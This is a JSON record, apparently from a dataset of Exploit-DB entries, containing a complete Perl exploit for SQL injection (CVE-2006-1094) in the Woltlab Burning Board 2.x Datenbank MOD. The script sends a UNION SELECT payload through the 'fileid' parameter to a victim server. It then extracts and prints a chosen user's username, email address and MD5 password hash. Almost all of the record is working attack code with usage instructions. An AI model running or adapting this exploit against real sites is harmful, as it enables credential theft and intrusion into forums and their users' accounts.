{
  "id": "1544",
  "title": "Woltlab Burning Board 2.x - Datenbank MOD &#039;fileid&#039; SQL Injection",
  "cve": "CVE-2006-1094",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Usage: wbb.pl <victim> <directory> <modpage> <dbnum> <userid>\r\n#Original Advisory: http://www.nukedx.com/?viewdoc=17\r\nuse IO::Socket;\r\nif(@ARGV < 5){\r\nprint \"\r\n+*************************************************************************+\r\n+Woltlab Burning Board 2.x (Datenbank MOD fileid) Remote SQL Injection XPL+\r\n+      Usage: wbb.pl <victim> <directory> <modpage> <dbnum> <userid>      +\r\n+                Example: wbb.pl sux.com / info_db.php  1 1               +\r\n+                  Method found & Exploit scripted by nukedx              +\r\n+*************************************************************************+\r\n\";\r\nexit();\r\n}\r\n#Local variables\r\n$wbbserver = $ARGV[0];\r\n$wbbserver =~ s/(http:\\/\\/)//eg;\r\n$wbbhost = \"http://\".$wbbserver;\r\n$port = \"80\";\r\n$wbbdir = $ARGV[1];\r\n$wbbpage  = $ARGV[2];\r\n$wbbdbid = $ARGV[3];\r\n$wbbid = $ARGV[4];\r\n$wbbtar = $wbbpage.\"?action=file&subkatid=1&noheader=1&fileid=\";\r\n$wbbxp = \"-1/**/UNION/**/SELECT/**/0,0,0,username,email,0,0,0,0,0,password,0,0,0,0,0,0,0/**/FROM/**/bb\".$wbbdbid.\"_users/**/where/**/userid=\".$wbbid;\r\n$wbbreq = $wbbhost.$wbbdir.$wbbtar.$wbbxp;\r\n$tag = \"'s\";\r\n#Writing data to socket\r\nprint \"+**********************************************************************+\\n\";\r\nprint \"+ Trying to connect: $wbbserver\\n\";\r\n$wbb = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$wbbserver\", PeerPort => \"$port\") || die \"\\n+ Connection failed...\\n\";\r\nprint $wbb \"GET $wbbreq\\n\";\r\nprint $wbb \"Host: $wbbserver\\n\";\r\nprint $wbb \"Accept: */*\\n\";\r\nprint $wbb \"Connection: close\\n\\n\";\r\nprint \"+ Connected!...\\n\";\r\nwhile($answer = <$wbb>) {\r\nif ($answer =~ /<span class=\\\"smallfont\\\"><b>(.*?)<\\/b> <\\/td>/){ \r\nprint \"+ Exploit succeed! Getting USERID: $wbbid$tag login information.\\n\";\r\nprint \"+ USERNAME: $1\\n\";\r\n}\r\nif ($answer =~ /([\\d,a-f]{32})<\\/td>/) { \r\nprint \"+ MD5 HASH OF PASSWORD: $1\\n\";\r\n}\r\nif ($answer =~ /<p><ul>(.*?)<\\/ul><\\/td>/) { \r\nprint \"+ MAIL: $1\\n\";\r\nprint \"+ SQL Injection exploit has been succesfully finished.\\n\";\r\nprint \"+ Woltlab runs on: $wbbhost$wbbdir\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit();\r\n}\r\nif ($answer =~ /users' doesn't exist /) { \r\nprint \"+ This version of Datenbank MOD is vulnerable too but you have speficied wrong database number!\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\nif ($answer =~ /number of columns/) { \r\nprint \"+ This version of Datenbank MOD is vulnerable too but default query of SQL-inject doesnt work on it\\n\";\r\nprint \"+ So please edit query by manually adding or removing null datas..\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\nexit(); \r\n}\r\n}\r\nprint \"+ Exploit failed :(\\n\";\r\nprint \"+**********************************************************************+\\n\";\r\n\r\n# nukedx.com [2006-03-01]\r\n\r\n# milw0rm.com [2006-03-01]",
  "url": "https://www.exploit-db.com/exploits/1544"
}